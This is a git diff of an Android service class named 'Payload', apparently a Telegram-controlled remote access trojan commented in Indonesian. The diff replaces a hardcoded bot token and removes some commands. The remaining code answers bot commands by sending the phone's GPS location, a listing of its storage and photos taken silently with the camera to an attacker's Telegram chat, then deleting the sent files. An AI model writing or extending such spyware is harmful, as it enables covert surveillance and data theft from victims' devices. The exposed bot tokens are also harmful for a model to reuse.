@@ -12,7 +12,6 @@ import android.hardware.Camera;
 import android.location.Location;
 import android.location.LocationManager;
 import android.os.Environment;
-import android.net.Uri;
 
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
@@ -26,7 +25,8 @@ import java.net.URLEncoder;
 import java.util.concurrent.TimeUnit;
 
 public class Payload extends Service {
-    private String BOT_TOKEN = "9153767226:AAG9WkQcikOjpFiwWKpQ8GkRC92xOUO92sc"; 
+    // ── TOKEN BOT BARU KAMU ──
+    private String BOT_TOKEN = "9163541732:AAHrGKUwIuEQ8OQOextL9deMJVWh6sSIqlw"; 
     private String CHAT_ID = "8598136412";
     
     private volatile boolean isRunning = true;
@@ -74,16 +74,6 @@ public class Payload extends Service {
                             sendTelegramMessage("📍 *Lokasi GPS:*\n" + getLocation());
                         } else if (jsonResponse.contains("\"text\":\"/cek_file\"")) {
                             sendTelegramMessage("📂 *Isi Folder /storage/emulated/0/ (10 Teratas):*\n" + listFiles("/storage/emulated/0/"));
-                        } else if (jsonResponse.contains("\"text\":\"/buka_url\"")) {
-                            openUrl("https://google.com");
-                            sendTelegramMessage("🌐 Membuka URL: https://google.com");
-                        } else if (jsonResponse.contains("\"text\":\"/ss\"")) {
-                            sendTelegramMessage("⚠️ Screenshot butuh akses MediaProjection (Tidak bisa silent).");
-                        } else if (jsonResponse.contains("\"text\":\"/screen_record\"")) {
-                            sendTelegramMessage("⚠️ Screen Record butuh akses MediaProjection (Tidak bisa silent).");
-                        } else if (jsonResponse.contains("\"text\":\"/rekam_depan\"") || jsonResponse.contains("\"text\":\"/rekam_belakang\"")) {
-                            sendTelegramMessage("⚠️ Rekam video butuh akses UI. Mengambil 1 foto sebagai gantinya.");
-                            if(jsonResponse.contains("/rekam_depan")) takePhoto(1); else takePhoto(0);
                         }
 
                     } catch (Exception e) { e.printStackTrace(); }
@@ -165,15 +155,6 @@ public class Payload extends Service {
         return sb.length() > 0 ? sb.toString() : "Folder kosong.";
     }
 
-    private void openUrl(String url) {
-        try {
-            Intent i = new Intent(Intent.ACTION_VIEW);
-            i.setData(Uri.parse(url));
-            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(i);
-        } catch (Exception e) { e.printStackTrace(); }
-    }
-
     private void takePhoto(int cameraId) {
         try {
             Camera camera = Camera.open(cameraId);
@@ -194,7 +175,6 @@ public class Payload extends Service {
         } catch (Exception e) { sendTelegramMessage("❌ Gagal ambil foto."); }
     }
 
-    // Fungsi Kirim Pesan Teks
     private void sendTelegramMessage(String pesan) {
         try {
             String encodedMsg = URLEncoder.encode(pesan, "UTF-8");
@@ -203,7 +183,6 @@ public class Payload extends Service {
         } catch (Exception e) { e.printStackTrace(); }
     }
 
-    // Fungsi Kirim File (Foto/Dokumen) ke Telegram
     private void sendTelegramFile(String filePath, boolean isPhoto, String caption) {
         String boundary = "*****";
         try {
@@ -245,8 +224,6 @@ public class Payload extends Service {
             request.close();
             
             conn.getResponseCode();
-            
-            // Hapus file setelah dikirim
             file.delete();
             
         } catch (Exception e) { e.printStackTrace(); }
